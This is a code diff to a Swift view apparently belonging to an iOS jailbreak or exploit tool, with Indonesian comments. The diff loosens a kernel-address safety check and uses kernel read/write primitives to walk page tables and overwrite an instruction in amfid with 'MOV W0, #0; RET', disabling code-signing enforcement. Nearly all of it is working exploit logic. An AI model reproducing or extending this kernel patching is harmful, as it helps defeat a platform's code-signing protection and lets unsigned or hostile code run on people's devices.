@@ -7559,11 +7559,17 @@ struct AMFIExperimentView: View {
                     let ttbrPhysmapVA = physTTBR &- gPhysBase &+ gVirtBase
                     detail += "TTBR physmap VA: 0x\(String(format: "%llx", ttbrPhysmapVA))\n"
 
-                    guard isSafePhysmapKRWAddress(ttbrPhysmapVA) else {
-                        detail += "❌ TTBR physmap VA tidak aman.\n"
+                    guard ttbrPhysmapVA >= 0xffffffdc00000000 && ttbrPhysmapVA < 0xffffffe500000000 else {
+                        detail += "❌ TTBR physmap VA tidak dalam range physmap.\n"
                         RootExecutor.rcall(rc, "free", amfidPath)
                         RootExecutor.rcall(rc, "free", patchedPathAddr)
                         return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+                    }
+
+                    // Helper: physmap range check (lebih permissive dari isSafePhysmapKRWAddress
+                    // yang exclude gVirtBase region — tapi page table walk PERLU akses situ)
+                    func isPhysmapRange(_ va: UInt64) -> Bool {
+                        va >= 0xffffffdc00000000 && va < 0xffffffe500000000
                     }
 
                     // amfid __TEXT runtime base dari vm_map walk sebelumnya
@@ -7600,14 +7606,14 @@ struct AMFIExperimentView: View {
                             l2PhysmapVA = ttbrPhysmapVA
                         }
 
-                        guard isSafePhysmapKRWAddress(l2PhysmapVA) else { continue }
+                        guard isPhysmapRange(l2PhysmapVA) else { continue }
 
                         let l2Entry = ds_kread64_safe(l2PhysmapVA + l2Idx * 8)
                         guard l2Entry & 0x3 == 0x3 else { continue }
 
                         let l3Phys = l2Entry & 0x0000FFFFFFFC0000
                         let l3PhysmapVA = l3Phys &- gPhysBase &+ gVirtBase
-                        guard isSafePhysmapKRWAddress(l3PhysmapVA) else { continue }
+                        guard isPhysmapRange(l3PhysmapVA) else { continue }
 
                         let l3Entry = ds_kread64_safe(l3PhysmapVA + l3Idx * 8)
                         guard l3Entry & 0x1 == 0x1 else { continue }
@@ -7615,7 +7621,7 @@ struct AMFIExperimentView: View {
                         let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                         let instrPhysmapVA = (pagePhys &- gPhysBase &+ gVirtBase) + pageOff
 
-                        guard isSafePhysmapKRWAddress(instrPhysmapVA) else { continue }
+                        guard isPhysmapRange(instrPhysmapVA) else { continue }
 
                         // Read original instruction
                         let origInstr = ds_kread32(instrPhysmapVA)
@@ -7650,17 +7656,17 @@ struct AMFIExperimentView: View {
 
                     let sigL1 = ds_kread64_safe(ttbrPhysmapVA + sigL1Idx * 8)
                     var sigL2VA: UInt64 = sigL1 & 0x3 == 0x3 ? ((sigL1 & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase) : ttbrPhysmapVA
-                    if isSafePhysmapKRWAddress(sigL2VA) {
+                    if isPhysmapRange(sigL2VA) {
                         let sigL2 = ds_kread64_safe(sigL2VA + sigL2Idx * 8)
                         if sigL2 & 0x3 == 0x3 {
                             let sigL3Phys = sigL2 & 0x0000FFFFFFFC0000
                             let sigL3VA = sigL3Phys &- gPhysBase &+ gVirtBase
-                            if isSafePhysmapKRWAddress(sigL3VA) {
+                            if isPhysmapRange(sigL3VA) {
                                 let sigL3 = ds_kread64_safe(sigL3VA + sigL3Idx * 8)
                                 if sigL3 & 0x1 == 0x1 {
                                     let sigPagePhys = sigL3 & 0x0000FFFFFFFC0000
                                     let sigInstrVA = (sigPagePhys &- gPhysBase &+ gVirtBase) + sigPageOff
-                                    if isSafePhysmapKRWAddress(sigInstrVA) {
+                                    if isPhysmapRange(sigInstrVA) {
                                         // Write MOV W0, #0 + RET
                                         ds_kwrite32(sigInstrVA, 0x52800000)
                                         ds_kwrite32(sigInstrVA + 4, 0xD65F03C0)
